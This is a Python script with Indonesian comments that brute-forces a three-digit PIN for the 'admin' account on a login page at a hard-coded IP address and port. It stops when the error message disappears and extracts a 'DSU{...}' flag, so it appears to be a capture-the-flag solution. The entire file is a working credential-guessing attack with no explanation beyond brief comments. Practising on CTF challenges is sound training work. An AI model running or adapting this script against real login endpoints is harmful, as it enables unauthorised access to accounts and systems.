import requests
import sys

# Konfigurasi Target
url = "http://169.55.125.215:61337/login"
username = "admin"

print(f"[*] Starting Targeted Brute Force (3-Digits) on {url}")

# Loop Range 000 - 999 (Sesuai bocoran /dev/note)
for i in range(1000):
    # Format angka menjadi 3 digit (contoh: 5 menjadi "005")
    pin_attempt = f"{i:03d}"
    
    data = {
        "username": username,
        "pin": pin_attempt
    }
    
    try:
        # Kirim request POST
        response = requests.post(url, data=data)
        
        # Cek apakah login berhasil (Pesan error hilang)
        if "Invalid username or PIN" not in response.text:
            print(f"\n[+] SUCCESS! Valid Credential Found.")
            print(f"[+] Username: {username}")
            print(f"[+] PIN: {pin_attempt}")
            
            # Print Flag dari response
            if "DSU{" in response.text:
                print("\n[+] Flag Content:")
                print(response.text.split("DSU{")[1].split("}")[0]) # Simple parsing
                print(f"[+] Full Flag: DSU{{{response.text.split('DSU{')[1].split('}')[0]}}}")
            
            break
        
        # Optional: Print progress setiap 100 request
        if i % 100 == 0:
            print(f"[*] Testing PIN: {pin_attempt}...")
            
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit()
